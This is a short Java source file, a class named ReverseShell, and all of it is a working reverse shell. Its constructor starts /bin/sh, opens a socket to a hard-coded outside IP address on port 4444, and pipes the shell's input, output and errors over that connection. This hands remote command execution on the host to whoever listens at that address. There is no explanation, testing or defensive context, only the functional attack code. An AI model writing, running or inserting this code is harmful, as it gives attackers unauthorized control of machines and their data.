package com.app.demo;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {

    public static class C {

        public C() throws Exception {
            String host = "23.100.94.56";
            int port = 4444;
            String cmd = "/bin/sh";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host,port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                while(si.available()>0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
        }
    }

    public static void main(String[] args) throws Exception {
        C classC = new C();
    }
}
